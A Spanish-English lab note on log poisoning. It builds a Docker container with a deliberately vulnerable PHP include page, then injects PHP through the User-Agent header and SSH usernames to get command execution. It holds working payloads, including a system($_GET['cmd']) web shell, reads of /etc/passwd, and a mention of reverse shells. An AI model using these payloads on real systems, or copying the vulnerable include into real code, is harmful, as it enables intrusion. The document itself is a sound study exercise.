**> **Log Poisoning** is an attack technique where malicious code is injected into log files, which are then included or executed through a Local File Inclusion vulnerability or similar mechanism, resulting in code execution.

## Como funciona
- Applications write various data to log files, including user-controlled input like User-Agent headers, usernames, or error messages. If an attacker can inject code into these logs and then trigger the log file's inclusion, the injected code executes.
### Common Log File Targets
- **Apache:** /var/log/apache2/access.log, error.log
- **Nginx:** /var/log/nginx/access.log, error.log
- **SSH:** /var/log/auth.log (inject via username)
- **Mail:** /var/log/mail.log
- **FTP:** /var/log/vsftpd.log
### Injection Vectors
- `User-Agent` header
- `Referer` header
- Username in login attempts
- Email addresses in mail logs
- Error messages that reflect input

## Caso practico
```
docker pull ubuntu:latest
docker run -dit --name logPoisoning -p 80:80 -p 22:22 ubuntu
docker exec -it logPoisoning bash
```

- Dentro del contenedor
```
apt install php nano apache2 ssh -y
```

- Preparamos el ambiente
```
cd /var/www/html
rm index.html
nano index.php
```

- Dentro del `index.php`
```php
<?php
	include($_GET['filename']);
?>
```
- Entonces en la web podemos `?filename=/etc/passwd`

- Dentro del contenedor damos permisos para leer los logs
```
cd /var/log
chown www-data:www-data -R apache2/
```
- Entonces en la web `?filename=/var/log/apache2/access.log` devuelve los logs del contenedor

- En los logs se ven asi
`172.17.0.1 - - [12/Mar/2026:08:33:08 -0300] "GET /index.php?filename=/var/log/apache2/access HTTP/1.1" 200 203 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36"`
- Vemos la ip del contenedor, la fecha, el metodo y la url accedidas, el codigo de estado y el navegador desde el que se hace la peticion.
- Este ultimo dato es gracias a la cabecera User-Agent que nos dice desde que navegador se realizan las peticiones, este es el que trataremos de manipular.

`curl -s -X GET "http://localhost/probando" -H "User-Agent: Probando"`
- Si vemos el ultimo log en vez de decir Mozilla... dice Probando

`curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system('whoami');?>"`
- Ya no aparece siquiera el User-Agent sino www-data y listo la hemos liado

`curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php phpinfo(); ?>"`
- phpinfo() devuelve muchisima informacion acerca del servicio php

`curl -s -X GET "http://localhost/probando" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"`
- Ahora puedes `&cmd=ls -l` y muchos mas y sobre todo reverse shell si deseas

## Mediante ssh
- La idea es que cuando intentamos loguearnos `usuario@ip-address` esto se almacena en el log de ssh `btmp`
`ssh usuario@172.17.0.2` si luego leemos el `cat /var/log/btmp` veremos el intento de conexion
`ssh "<?php system($_GET['cmd']); ?>"@172.17.0.2` veremos el intento, pero si en la web `&cmd=ls -l` se ejecuto el comando y listo